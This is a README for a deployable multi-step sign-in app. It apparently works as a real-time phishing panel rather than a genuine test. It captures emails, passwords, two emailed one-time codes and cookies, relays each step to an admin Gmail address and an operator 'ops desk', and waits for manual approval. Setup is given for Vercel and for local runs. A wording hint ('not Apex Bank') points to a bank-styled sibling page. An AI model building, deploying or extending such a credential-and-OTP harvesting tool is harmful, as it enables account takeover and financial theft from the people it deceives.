# Login Ops Test

Standalone multi-step sign-in test (not Apex Bank).

## Flow
1. Email + password (any email works — no account required; only email must be real to receive OTP)
2. Username (max 6 characters)
3. OTP #1 emailed → enter it
4. **New** OTP #2 emailed immediately → enter it
5. Wait for ops desk **Approve / Reject**
6. On approve → congratulations page

Admin is notified at every step (email + ops desk). **Test mode** shows plain text: email, password, username, OTP, cookies.

## Admin
- Email: `blessedresult6@gmail.com` (override with `ADMIN_EMAIL`)
- Ops desk: `/ops` — sign in with admin email + `ADMIN_OPS_PASSWORD`

## Deploy (Vercel)
1. Import this repo
2. Set env vars from `.env.example`
3. Deploy

## Local
```bash
npm install
cp .env.example .env.local
# edit .env.local
npm run dev
```

Open http://localhost:3000/sign-in and http://localhost:3000/ops

## Note on storage
Attempts are stored in server memory (fine for a quick test). Restart clears them. For production use a database.
